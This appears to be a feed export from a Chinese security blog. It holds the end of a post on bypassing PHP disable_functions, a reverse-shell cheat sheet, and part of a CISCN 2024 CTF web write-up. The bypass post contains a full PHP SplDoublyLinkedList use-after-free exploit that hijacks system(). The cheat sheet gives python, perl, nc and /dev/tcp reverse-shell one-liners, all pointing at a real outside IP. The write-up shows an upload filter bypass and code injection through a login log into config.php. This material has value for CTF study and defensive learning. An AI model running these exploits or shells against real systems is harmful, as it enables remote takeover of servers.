class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nameAddr</span> &gt; <span class="hljs-variable">$address</span> || <span class="hljs-variable">$nameAddr</span> &lt; <span class="hljs-variable">$lowestAddr</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$nameAddr</span>));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name</span>));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-variable">$name</span>)[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span> === <span class="hljs-string">&quot;system&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-number">0x08</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trigger</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$s</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0xf</span>));<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1234567812345678</span>);<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">7</span>);<br>        <span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>();<br>        <span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">next</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>() !== <span class="hljs-number">0x1234567812345678</span>) &#123;<br>             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]UAF Failed&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$maps</span>) &#123;<br>            <span class="hljs-title function_ invoke__">cantRead</span>(<span class="hljs-variable">$a</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">canRead</span>(<span class="hljs-variable">$maps</span>, <span class="hljs-variable">$a</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Done&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bypass</span>(<span class="hljs-params"><span class="hljs-variable">$elementAddress</span>, &amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$closureChunkAddress</span> = <span class="hljs-title function_ invoke__">getClosureChunk</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$elementAddress</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get Closure Chunk Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$closure_object</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closureChunkAddress</span> + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Closure Object: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$closure_object</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Closure Handler: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$closure_handlers</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$system_address</span> = <span class="hljs-title function_ invoke__">getSystem</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closure_handlers</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Couldn&#x27;t determine system address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Find system&#x27;s handler: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$system_address</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x506</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; (<span class="hljs-number">0x130</span> / <span class="hljs-number">0x08</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x08</span> * <span class="hljs-variable">$i</span>);<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>(), <span class="hljs-number">0x08</span> * <span class="hljs-variable">$i</span> + <span class="hljs-number">0x100</span>, <span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$closure_object</span> + <span class="hljs-number">0x30</span>);<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>(), <span class="hljs-number">0x20</span>, <span class="hljs-variable">$system_address</span>);<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$closure_object</span>);<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x108</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Executing command: \n&quot;</span>;<br>    (<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>())(<span class="hljs-string">&quot;php -v&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">canRead</span>(<span class="hljs-params"><span class="hljs-variable">$maps</span>, &amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$chunkAddress</span> = <span class="hljs-title function_ invoke__">getPHPChunk</span>(<span class="hljs-variable">$maps</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get PHP Chunk Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$elementAddress</span> = <span class="hljs-title function_ invoke__">getElement</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$chunkAddress</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">bypass</span>(<span class="hljs-variable">$elementAddress</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cantRead</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test2&quot;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Please try to get address of PHP Chunk&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">bomb1</span>(<span class="hljs-variable">$a</span>)));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test2&quot;</span>])) &#123;<br>        <span class="hljs-variable">$elementAddress</span> = <span class="hljs-title function_ invoke__">bomb2</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$elementAddress</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">bypass</span>(<span class="hljs-variable">$elementAddress</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplDoublyLinkedList</span>();<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Trigger</span>());<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(<span class="hljs-string">&quot;Twings&quot;</span>);<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(function(<span class="hljs-variable">$x</span>)&#123;&#125;);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$x</span> &lt; <span class="hljs-number">0x100</span>;<span class="hljs-variable">$x</span>++) &#123;<br>    <span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">0x1234567812345678</span>);<br>&#125;<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">rewind</span>();<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$s</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>包含该php即可执行命令(141行)</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>大部分绕过方法在蚁剑中都有插件可以自动利用</p></blockquote><p>绕过disable_functions的方法大致可以分为以下几类</p><p>1：寻找未禁用的函数</p><p>2：攻击后端组件：Apache_mod_cgi；ImageMagick；Bash Shellshock；</p><p>3：利用php的扩展：制作恶意php扩展；php74_FFI；windows com；imap_open()；</p><p>4：利用环境变量或者so文件：LD_PRELOAD；php-fpm；iconv；</p><p>5：pwn：写shellcode劫持got表；php7_GC_UAF；JSON_Serializer_UAF；php7_Backtrace_UAF；php_Concat_UAF；php7_UserFilter；php7_ReflectionProperty_UAF；php7_SplDoublyLinkedList UAF；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常规函数函数绕过&quot;&gt;&lt;a href=&quot;#常规函数函数绕过&quot; class=&quot;headerlink&quot; title=&quot;常规函数函数绕过&quot;&gt;&lt;/a&gt;常规函数函数绕过&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php" scheme="https://www.dr0n.top/tags/php/"/>
    
    <category term="bypass" scheme="https://www.dr0n.top/tags/bypass/"/>
    
    <category term="disable_fuctions" scheme="https://www.dr0n.top/tags/disable-fuctions/"/>
    
    <category term="pwn" scheme="https://www.dr0n.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell</title>
    <link href="https://www.dr0n.top/posts/2f610211/"/>
    <id>https://www.dr0n.top/posts/2f610211/</id>
    <published>2024-07-15T03:00:00.000Z</published>
    <updated>2024-07-15T06:18:57.289Z</updated>
    
    <content type="html"><![CDATA[<p>反弹shell的常用命令</p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;47.99.77.52&quot;,8888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;47.99.77.52&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight nc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nc">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bi<span class="hljs-symbol">n/sh -i 2</span>&gt;&amp;<span class="hljs-number">1</span>|<span class="hljs-symbol">nc 47</span><span class="hljs-number">.99</span><span class="hljs-number">.77</span><span class="hljs-number">.52</span> <span class="hljs-number">8888</span> &gt;/tmp/f<br></code></pre></td></tr></table></figure><h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/sh -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;反弹shell的常用命令&lt;/p&gt;
&lt;h2 id=&quot;python&quot;&gt;&lt;a href=&quot;#python&quot; class=&quot;headerlink&quot; title=&quot;python&quot;&gt;&lt;/a&gt;python&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;tab</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="反弹shell" scheme="https://www.dr0n.top/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>第十七届全国大学生信息安全竞赛-华东南分区赛</title>
    <link href="https://www.dr0n.top/posts/deeac2cd/"/>
    <id>https://www.dr0n.top/posts/deeac2cd/</id>
    <published>2024-06-25T04:30:00.000Z</published>
    <updated>2024-07-05T15:19:24.182Z</updated>
    
    <content type="html"><![CDATA[<p>1签到+4web+4pwn</p><h1 id="web-welcome"><a href="#web-welcome" class="headerlink" title="web-welcome"></a>web-welcome</h1><p>签到，Ctrl+U</p><p><img src="/img/wp/2024/2024ciscn-welcome_1.png"></p><h1 id="web-submit"><a href="#web-submit" class="headerlink" title="web-submit"></a>web-submit</h1><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p>文件上传，有对内容检测，使用短标签绕过</p><p><img src="/img/wp/2024/2024ciscn-submit-BREAK_1.png"></p><p><img src="/img/wp/2024/2024ciscn-submit-BREAK_2.png"></p><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>添加黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// $path = &quot;./uploads&quot;;</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads&quot;</span>;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-variable">$allow_content_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;image/png&quot;</span>);<br><span class="hljs-variable">$type</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;myfile&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, <span class="hljs-variable">$allow_content_type</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;只允许png哦!&lt;br&gt;&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">// 修改点</span><br><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(php|script|xml|user|htaccess)/i&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-comment">// echo &quot;匹配成功!&quot;;</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;鼠鼠说你的内容不符合哦0-0&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Success!&lt;br&gt;&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Error!&lt;br&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!----&gt;<br><br></code></pre></td></tr></table></figure><h1 id="web-粗心的程序员"><a href="#web-粗心的程序员" class="headerlink" title="web-粗心的程序员"></a>web-粗心的程序员</h1><h2 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h2><p>扫目录，得到<code>www.zip</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;default_info_auto_recovery.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|php|:/i&quot;</span>,<span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$id</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello,&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$username</span>&quot;</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;//登陆时间<span class="hljs-subst">$time</span>,<span class="hljs-subst">$username</span> <span class="hljs-subst">$p</span>&quot;</span>;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>).<span class="hljs-variable">$str</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO ACCESS&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>home.php中会写入登录日志<code>$str = &quot;//登陆时间$time,$username $p&quot;;</code></p><p>用<code>?&gt;&lt;? phpinfo(); //</code>截断注释输出phphinfo</p><p><img 